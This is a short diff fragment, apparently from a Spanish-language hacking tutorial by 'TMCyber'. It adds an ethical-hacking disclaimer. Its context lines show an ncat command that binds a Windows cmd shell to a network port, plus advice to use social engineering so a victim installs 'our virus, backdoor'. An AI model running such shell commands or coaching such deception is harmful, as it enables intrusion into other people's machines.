@@ -57,3 +57,10 @@ ncat -v 192.168.1.200 4444 -e cmd
 * Y por suspuesto > usar ingenieria social para hacer que esa persona instale nuestro virus, backdoor..etc.
 
 
+
+
+
+
+
+# "TMCyber offers its information on the Internet basically for the benefit of people interested in the efforts and in favor of the implementation of the protection and promotion of computer security (Cybersecurity) and Ethical Hacking.""
+TMCyber is not responsible for the misuse of this tool.
